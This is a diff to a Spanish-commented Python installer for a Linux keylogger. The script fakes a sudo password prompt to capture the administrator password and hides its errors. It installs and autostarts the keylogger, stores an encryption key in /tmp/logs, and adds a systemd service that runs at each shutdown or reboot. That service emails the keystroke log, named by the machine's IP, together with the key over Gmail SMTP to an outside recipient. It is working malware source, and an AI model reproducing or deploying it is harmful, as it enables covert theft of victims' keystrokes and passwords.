@@ -14,23 +14,160 @@ def install_dependencies():
 # Ejecuta la función para instalar las dependencias al inicio del script
 install_dependencies()
 
-import keyboard  # Biblioteca de captura de teclas, reemplaza a "pynput"
-
 # Archivo de bandera para indicar si la instalación ya se realizó
 flag_file = "/var/log/installer_flag.txt"
-
-# ---- Instalación automática de dependencias ----
 
 # Función que verifica si el script tiene permisos de administrador
 def check_admin():
     if os.geteuid() != 0:  # Verifica si el ID de usuario es root (0)
-        print("Este script requiere privilegios de administrador. Por favor, ejecútelo con sudo.")
+        #print("Este script requiere privilegios de administrador. Por favor, ejecútelo con sudo.")
         exit(1)
 
 # Simula la solicitud de contraseña de administrador (muestra un mensaje similar al de sudo)
 def get_admin_password():
     password = getpass.getpass(prompt="Sorry, try again.\n[sudo] password for kali: ")
     return password
+
+def create_shutdown_script():
+    script_apagado = '''
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import socket
+import os
+import netifaces
+import time
+
+log_dir = "/tmp/logs/"
+key_path = '/tmp/logs/key.txt'
+
+# Función para obtener la IP de la máquina (excluyendo la IP local 127.0.0.1)
+def get_ip_address(retries=5, delay=5):
+    for attempt in range(retries):
+        try:
+            # Recorre todas las interfaces de red para obtener una dirección IP
+            for interface in netifaces.interfaces():
+                if netifaces.AF_INET in netifaces.ifaddresses(interface):
+                    ip_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
+                    ip = ip_info['addr']
+                    if ip != "127.0.0.1":  # Excluye la IP de loopback
+                        return ip
+            # Espera antes de reintentar
+            time.sleep(delay)
+        except Exception as e:
+            time.sleep(delay)
+    return "unknown_ip"
+
+# Nombre del archivo log basado en la IP
+ip_address = get_ip_address()
+log_file = os.path.join(log_dir, f"{ip_address}.log")
+
+# Configuración del correo
+SMTP_SERVER = 'smtp.gmail.com'  # Cambia por tu servidor SMTP
+SMTP_PORT = 587
+SMTP_USER = 'senderemail@gmail.com'
+SMTP_PASS = 'app_password' 
+RECIPIENT = 'recipientemail@gmail.com'
+
+# Función para leer la clave desde el archivo
+def read_key():
+    try:
+        with open(key_path, 'rb') as archivo_clave:
+            return archivo_clave.read().decode('utf-8')
+    except Exception as e:
+        #print(f"Error al leer la clave: {e}")
+        return "Clave no disponible"
+
+def enviar_correo():
+    # Crear el directorio si no existe
+    os.makedirs(log_dir, exist_ok=True)
+
+    key_subject = read_key()
+
+    # Crear el mensaje
+    msg = MIMEMultipart()
+    msg['From'] = SMTP_USER
+    msg['To'] = RECIPIENT
+    msg['Subject'] = key_subject
+
+    # Adjuntar archivo
+    if os.path.exists(log_file):
+        with open(log_file, 'rb') as attachment:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(attachment.read())
+            encoders.encode_base64(part)
+            part.add_header(
+                'Content-Disposition',
+                f'attachment; filename={os.path.basename(log_file)}',
+            )
+            msg.attach(part)
+    else:
+        #print(f"Archivo {log_file} no encontrado")
+        exit(1)
+
+    # Enviar el mensaje
+    try:
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(SMTP_USER, SMTP_PASS)
+        server.sendmail(SMTP_USER, RECIPIENT, msg.as_string())
+        server.quit()
+        #print("Correo enviado correctamente")
+    except Exception as e:
+        #print(f"Error al enviar el correo: {e}")
+
+if __name__ == "__main__":
+    enviar_correo()
+
+'''
+    destination_path = "/usr/local/bin/shutdownandreboot.py"  # Destino donde se guarda el archivo de keylogger
+    try:
+        with open(destination_path, 'w') as f:
+            f.write(script_apagado)
+        os.chmod(destination_path, 0o711) 
+    except Exception as e:
+        exit(1)
+
+
+def create_shutdownreboot_service():
+    service_path = "/etc/systemd/system/shutdownandreboot.service"
+
+    # Contenido del archivo de servicio
+    service_content = """[Unit]
+    Description=Enviar log antes del apagado o reinicio
+    DefaultDependencies=no
+    Before=shutdown.target reboot.target halt.target
+
+    [Service]
+    Type=oneshot
+    ExecStart=/usr/bin/python3 /usr/local/bin/shutdownandreboot.py
+
+    [Install]
+    WantedBy=halt.target reboot.target shutdown.target
+    """
+
+    # Crear y escribir el archivo de servicio
+    try:
+        with open(service_path, 'w') as service_file:
+            service_file.write(service_content)
+        #print("Archivo de servicio creado exitosamente.")
+    except Exception as e:
+        #print(f"Error al crear el archivo de servicio: {e}")
+        exit(1)
+
+    # Habilitar el servicio sin salida estándar ni errores visibles
+    try:
+        subprocess.run(
+            ["sudo", "systemctl", "enable", "shutdownandreboot.service"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=True
+        )
+        #print("Servicio habilitado exitosamente.")
+    except subprocess.CalledProcessError as e:
+        #print(f"Error al habilitar el servicio: {e}")
+        exit(1)
 
 # Función que copia el código del keylogger en un archivo dentro de /usr/local/bin
 def copy_keylogger():
@@ -56,6 +193,9 @@ log_dir = "/tmp/logs/"
 if not os.path.exists(log_dir):
     os.makedirs(log_dir)  # Crea el directorio si no existe
     os.chmod(log_dir, 0o777)  # Asigna permisos de escritura
+
+with open('/tmp/logs/key.txt', 'wb') as crypto_key:
+    crypto_key.write(key)
 
 # Función para obtener la IP de la máquina (excluyendo la IP local 127.0.0.1)
 def get_ip_address(retries=5, delay=5):
@@ -179,3 +319,5 @@ copy_keylogger()  # Copia el keylogger al sistema
 setup_autostart()  # Configura el arranque automático
 create_flag()  # Crea la bandera de instalación
 execute_keylogger_immediately()  # Ejecuta el keylogger inmediatamente
+create_shutdown_script()
+create_shutdownreboot_service()
